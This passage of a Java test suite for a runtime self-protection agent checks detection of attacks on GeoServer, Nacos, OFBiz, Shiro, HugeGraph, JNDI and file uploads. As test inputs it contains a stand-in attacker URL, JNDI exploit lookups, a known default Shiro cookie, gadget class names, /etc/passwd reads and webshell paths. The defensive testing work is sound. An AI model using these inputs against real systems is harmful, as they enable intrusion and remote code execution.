                        "GET",
                        "/geoserver/ows",
                        "service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example")
                    .withParameter("service", "wfs")
                    .withParameter("request", "GetFeature")
                    .withParameter("typeName", "vulhub:example")
                    .withParameter("CQL_FILTER", filter)));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_ogc_filter_sql_injection\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("parameter=CQL_FILTER"));
    assertTrue(text.contains("value=[redacted]"));
    assertFalse(text.contains("SELECT version"));
  }

  @Test
  void ignoresNormalGeoServerCqlFilter() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-geoserver-cql-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub(
                "GET",
                "/geoserver/ows",
                "service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example")
            .withParameter("service", "wfs")
            .withParameter("request", "GetFeature")
            .withParameter("typeName", "vulhub:example")
            .withParameter("CQL_FILTER", "strStartsWith(name,'x') = true"));
    Java8RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksInternalServiceIdentityOnSensitiveControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-internal-identity", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub(
                        "POST", "/nacos/v1/auth/users", "username=vulhub&password=vulhub")
                    .withHeader("User-Agent", "Nacos-Server")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_internal_identity\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/nacos/v1/auth/users"));
  }

  @Test
  void ignoresInternalServiceIdentityOnNonControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-internal-identity-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/nacos/v1/ns/instance/list", "serviceName=demo")
            .withHeader("User-Agent", "Nacos-Server"));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresNacosInternalMaintenancePath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-internal-identity-maintenance", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/nacos/v1/cs/ops/data/removal", "")
            .withHeader("User-Agent", "Nacos-Server"));
    Java8RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresNormalUserAgentOnSensitiveControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-internal-identity-user", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/nacos/v1/auth/users", "pageNo=1&pageSize=9")
            .withHeader("User-Agent", "Mozilla/5.0"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsRemoteTemplateSourceParameterOnControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-template-source", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub(
                "POST",
                "/webtools/control/forgotPassword/StatsSinceStart",
                "statsDecoratorLocation=http%3A%2F%2Fevil.example%2Fofbiz%2Fpayload.xml")
            .withParameter(
                "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_template_source\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("parameter=statsDecoratorLocation"));
    assertTrue(text.contains("target=remote-url"));
    assertFalse(text.contains("evil.example"));
  }

  @Test
  void ignoresRemoteTemplateSourceParameterOutsideControlPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-template-source-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/api/preferences", "")
            .withParameter(
                "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml"));

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksRemoteTemplateSourceParameterWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-template-source-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub(
                        "POST",
                        "/webtools/control/forgotPassword/StatsSinceStart",
                        "")
                    .withParameter(
                        "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_template_source\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksDefaultJwtSecretBearerTokenWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-default-jwt", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub("GET", "/graphs", "")
                    .withHeader("Authorization", "Bearer " + HUGEGRAPH_DEFAULT_JWT)));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_default_jwt_secret\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("hugegraph-default-token-secret"));
    assertFalse(text.contains(HUGEGRAPH_DEFAULT_JWT));
  }

  @Test
  void blocksDefaultJwtSecretBearerTokenFromJaxRsRequestWhenBlockModeIsEnabled()
      throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-default-jwt-jaxrs", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new JaxRsRequestStub("GET", "http://127.0.0.1:8080/graphs?format=json")
                    .withHeader("Authorization", "Bearer " + HUGEGRAPH_DEFAULT_JWT)));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_default_jwt_secret\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/graphs"));
    assertFalse(text.contains(HUGEGRAPH_DEFAULT_JWT));
  }

  @Test
  void ignoresBearerJwtWithUnknownSignature() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-default-jwt-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/graphs", "")
            .withHeader("Authorization", "Bearer " + HUGEGRAPH_TAMPERED_JWT));

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksJwtVerificationFailureContinuationWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jwt-verification-failure", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/de2api/user/info", "")
            .withHeader("X-DE-TOKEN", DATAEASE_WRONG_SIGNATURE_JWT));
    try {
      assertThrows(
          Java8RaspBlockException.class,
          () ->
              Java8RaspHooks.beforeJwtVerificationFailure(
                  DATAEASE_WRONG_SIGNATURE_JWT,
                  new com.auth0.jwt.exceptions.SignatureVerificationException("bad signature")));
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_jwt_verification_failure\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("source=X-DE-TOKEN"));
    assertTrue(text.contains("SignatureVerificationException"));
    assertFalse(text.contains(DATAEASE_WRONG_SIGNATURE_JWT));
  }

  @Test
  void ignoresJwtVerificationFailureWithoutRequestToken() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jwt-verification-quiet", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(new RequestStub("GET", "/de2api/user/info", ""));
    try {
      Java8RaspHooks.beforeJwtVerificationFailure(
          DATAEASE_WRONG_SIGNATURE_JWT,
          new com.auth0.jwt.exceptions.SignatureVerificationException("bad signature"));
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksShiroSemicolonTraversalAdminBypassPathWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-shiro-semicolon", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeHttpRequest(new RequestStub("GET", "/xxx/..;/admin/", "")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_path_confusion\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/xxx/..;/admin/"));
  }

  @Test
  void logsShiroDefaultRememberMeSerializedCookie() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-shiro-rememberme", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub(
            "GET",
            "/",
            "",
            new CookieStub(
                "rememberMe", "AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8=")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_default_crypto_cookie\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"cookie\":\"rememberMe shiro-default-aes-cbc\""));
    assertFalse(text.contains("AAECAwQFBgc"));
  }

  @Test
  void ignoresOrdinaryRememberMeCookie() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-shiro-rememberme-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/", "", new CookieStub("rememberMe", "ordinary-user-token")));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsFilesystemShapedJsessionid() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-session-file", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", ".deserialize")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_session_file_deserialization\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("hidden-file-session-id"));
  }

  @Test
  void ignoresOrdinaryJsessionidRouteSuffix() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-session-file-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", "abc123.node1")));

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksFilesystemShapedJsessionidWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-session-file-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", ".deserialize"))));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_session_file_deserialization\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksShiroDefaultRememberMeSerializedCookieWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-shiro-rememberme-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub(
                    "GET",
                    "/",
                    "",
                    new CookieStub(
                        "rememberMe", "AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8="))));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_default_crypto_cookie\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsSparkRestRemoteJobSubmission() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-spark-rest", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeSparkRestSubmit(sparkRestSubmissionBody());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_remote_job_submission\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"hook\":\"SparkRest.handleSubmit\""));
  }

  @Test
  void blocksSparkRestRemoteJobSubmissionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-spark-rest-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeSparkRestSubmit(sparkRestSubmissionBody()));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_remote_job_submission\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsYarnResourceManagerApplicationSubmission() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-yarn-rest", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeYarnApplicationSubmit(yarnSubmission("touch /tmp/ohmyrasp-yarn-success"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_remote_job_submission\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"hook\":\"RMWebServices.submitApplication\""));
    assertTrue(text.contains("commands=1"));
    assertFalse(text.contains("touch /tmp/ohmyrasp-yarn-success"));
  }

  @Test
  void blocksYarnResourceManagerApplicationSubmissionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-yarn-rest-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeYarnApplicationSubmit(yarnSubmission("touch /tmp/ohmyrasp-yarn-block-success")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_remote_job_submission\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertFalse(text.contains("touch /tmp/ohmyrasp-yarn-block-success"));
  }

  @Test
  void ignoresLocalJndiLookup() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jndi-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJndiLookup("java:comp/env/jdbc/app");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsRemoteJndiLookup() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jndi-remote", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJndiLookup("ldap://127.0.0.1:1389/Exploit");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jndi_remote_lookup\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"lookup\":\"ldap://127.0.0.1:1389/Exploit\""));
  }

  @Test
  void blocksRemoteJndiLookupWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jndi-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeJndiLookup("rmi://127.0.0.1:1099/Exploit"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jndi_remote_lookup\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalDeserializationClass() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-deser-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeObjectStreamClassResolve(ObjectStreamClass.lookup(String.class));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsDangerousDeserializationProxyInterface() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-deser-danger", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeObjectStreamProxyResolve(
        new String[] {"org.apache.commons.collections.functors.InvokerTransformer"});

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_deserialization_gadget_class\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"class\":\"org.apache.commons.collections.functors.InvokerTransformer\""));
  }

  @Test
  void logsBeanShellDeserializationGadgetClass() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-deser-beanshell", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeObjectStreamProxyResolve(new String[] {"bsh.XThis$Handler"});

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_deserialization_gadget_class\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"class\":\"bsh.XThis$Handler\""));
  }

  @Test
  void blocksDangerousDeserializationClassWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-deser-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeObjectStreamProxyResolve(
                new String[] {"com.sun.rowset.JdbcRowSetImpl"}));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_deserialization_gadget_class\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresBenignHessianType() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-hessian-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHessianType("java.util.HashMap");

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksDangerousHessianTypeWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-hessian-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeHessianType("[Lorg/apache/commons/beanutils/BeanComparator;"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_deserialization_hessian_type\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("\"class\":\"org.apache.commons.beanutils.BeanComparator\""));
  }

  @Test
  void ignoresNormalFileReadAndWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-file-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileRead("/tmp/application-cache.txt");
    Java8RaspHooks.beforeFileWrite("/tmp/application-cache.txt");
    Java8RaspHooks.beforeNioFileRead("/tmp/application-cache.txt");
    Java8RaspHooks.beforeNioFileWrite("/tmp/application-cache.txt");
    Java8RaspHooks.beforeNioByteChannelOpen("/tmp/application-cache.txt", Arrays.asList("READ"));
    Java8RaspHooks.beforeNioByteChannelOpen("/tmp/application-cache.txt", Arrays.asList("WRITE"));
    Java8RaspHooks.beforeFileWrite(
        "/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/io/example/App.class");
    Java8RaspHooks.beforeFileWrite(
        "/opt/coldfusion11/cfusion/wwwroot/WEB-INF/cfclasses/cfcomponent2ecfc531178316.class");
    Java8RaspHooks.beforeFileWrite("/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/app.jar");
    org.apache.catalina.startup.ExpandWar.writeJava8DeploymentFile(
        "/usr/local/tomcat/webapps/ROOT/index.jsp");
    org.apache.jasper.compiler.JDTCompiler.writeJava8JspCompilationFile(
        "/usr/local/tomcat/work/Catalina/localhost/ROOT/org/apache/jsp/index_jsp.class");
    io.netty.resolver.HostsFileEntriesProvider.ParserImpl.readJava8HostsFile("/etc/hosts");

    assertFalse(Files.exists(log));
  }


  @Test
  void ignoresMavenRepositoryJarWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-maven-repository", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeFileWrite(
        "/root/.m2/repository/org/apache/cxf/karaf/cxf-karaf-commands/3.3.4/cxf-karaf-commands-3.3.4.jar");

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresTeamCityBundledPluginUnpackDuringStartup() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-plugin", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    jetbrains.buildServer.web.impl.BuildServerConfigurator.invokeJava8BundledPluginUnpack(
        "/opt/teamcity/webapps/ROOT/WEB-INF/plugins/.unpacked/GitLabIssues/server/TeamCity.GitLabIssues-server-1.0-SNAPSHOT.jar");
    jetbrains.buildServer.web.impl.BuildServerConfigurator.invokeJava8PluginResourceUnpack(
        "/opt/teamcity/webapps/ROOT/plugins/artifactsSizeStatistics/suggestions/artifactsSizeDrop.jsp");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsSensitiveFileRead() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-file-read", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeNioByteChannelOpen("/etc/passwd", Arrays.asList("READ"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_sensitive_read\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"path\":\"/etc/passwd\""));
  }

  @Test
  void logsWebrootScriptFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-file-write", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileWrite("/tmp/webapps/ROOT/shell.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"path\":\"/tmp/webapps/ROOT/shell.jsp\""));
  }

  @Test
  void logsRelativeJavaWebappScriptFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-file-relative-webapp-write", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileWrite("./applications/accounting/webapp/accounting/index.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(
        text.contains(
            "\"path\":\"./applications/accounting/webapp/accounting/index.jsp\""));
  }

  @Test
  void logsTraversalExecutableFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-file-traversal-write", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileWrite("/tmp/flink-upload/../../tmp/evil.jar");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"path\":\"/tmp/flink-upload/../../tmp/evil.jar\""));
  }

  @Test
  void logsTeamCityPluginJarWriteOutsideStartupStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-plugin-direct", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileWrite(
        "/opt/teamcity/webapps/ROOT/WEB-INF/plugins/.unpacked/evil/server/Evil.jar");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void logsTeamCityPluginJspWriteOutsideStartupStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-plugin-jsp-direct", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileWrite(
        "/opt/teamcity/webapps/ROOT/plugins/artifactsSizeStatistics/suggestions/artifactsSizeDrop.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void logsWebLogicWsUtcJspUploadFilename() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-weblogic-wsutc-upload", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/ws_utc/resources/setting/keystore", ""));
    try {
      Java8RaspHooks.beforeFileUpload("ohmyrasp-wl2894.jsp");
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"fileUpload_multipart_script\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"filename\":\"ohmyrasp-wl2894.jsp\""));
  }

  @Test
  void logsMultipartExpressionUploadFilename() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-expression-upload", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileUpload("%{#context['x']}\0b");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"fileUpload_multipart_expression\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void logsMultipartPathTraversalUploadFilename() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-traversal-upload", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileUpload("..\\..\\shell.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"fileUpload_path_traversal\""));
    assertTrue(text.contains("\"filename\":\"../../shell.jsp\""));
  }

  @Test
  void logsMultipartHtmlAndExecutableUploadFilenames() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-html-exe-upload", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFileUpload("phish.html");
    Java8RaspHooks.beforeFileUpload("dropper.exe");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"fileUpload_multipart_html\""));
    assertTrue(text.contains("\"algorithm\":\"fileUpload_multipart_exe\""));
  }

  @Test
  void ignoresNormalImageUploadFilename() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-image-upload", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

